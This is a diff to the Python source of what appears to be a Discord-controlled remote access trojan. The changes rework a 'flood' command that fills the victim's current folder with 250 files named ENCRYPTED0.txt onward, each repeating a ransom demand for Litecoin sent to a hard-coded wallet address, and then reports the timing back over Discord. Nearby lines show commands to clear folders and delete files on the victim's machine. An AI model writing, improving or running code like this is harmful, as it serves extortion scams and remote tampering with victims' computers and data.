@@ -1,4 +1,5 @@
 import os, discord, subprocess, random, string, shutil, aiohttp, time
+import asyncio
 from concurrent.futures import ThreadPoolExecutor
 from discord import Embed
 CRYPTO_ADDRESS = 'LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB'
@@ -238,20 +239,35 @@ async def cd_command(ctx, *, args: str = None):
         except Exception as e:
             embed = discord.Embed(title="Error", description=f"Error clearing folder: {e}", color=0xd32f2f)
             await ctx.send(embed=embed)
-            
     elif args == "flood":
         try:
+            start_time = time.time()
+            created_files = 0
             def create_file(i):
+                nonlocal created_files
                 file_path = os.path.join(current_directory, f"ENCRYPTED{i}.txt")
                 with open(file_path, "w") as f:
-                    f.write(f"Pay 100 USD in LITECOIN to {CRYPTO_ADDRESS} or your files, pc and data are gone!!!\n" * 5000)
-            
-            with ThreadPoolExecutor(max_workers=10) as executor:
-                for i in range(250):
-                    executor.submit(create_file, i)
-            await ctx.send("The folder is flooded with a shit ton of files.")
+                    f.write(f"Pay 100 USD in LITECOIN to {CRYPTO_ADDRESS} or your files, pc and data are gone!!!\n" * 500)
+                created_files += 1
+            loop = asyncio.get_event_loop()
+            with ThreadPoolExecutor(max_workers=6) as executor:
+                tasks = [loop.run_in_executor(executor, create_file, i) for i in range(250)]
+                await asyncio.gather(*tasks)
+            end_time = time.time()
+            elapsed_time = end_time - start_time
+            embed = discord.Embed(
+                title="FileFlood",
+                description=f"Folder: {current_directory} was flooded with {created_files} files in approximately {elapsed_time:.2f} seconds.",
+                color=0x00ff00
+            )
+            await ctx.send(embed=embed)
         except Exception as e:
-            await ctx.send(f"Error during flood: {e}")
+            embed = discord.Embed(
+                title="Error",
+                description=f"Error during flood: {e}",
+                color=0xff0000
+            )
+            await ctx.send(embed=embed)
     elif args.startswith("deletefile "):
         file_path = args[len("deletefile "):].strip()
         if os.path.exists(file_path):
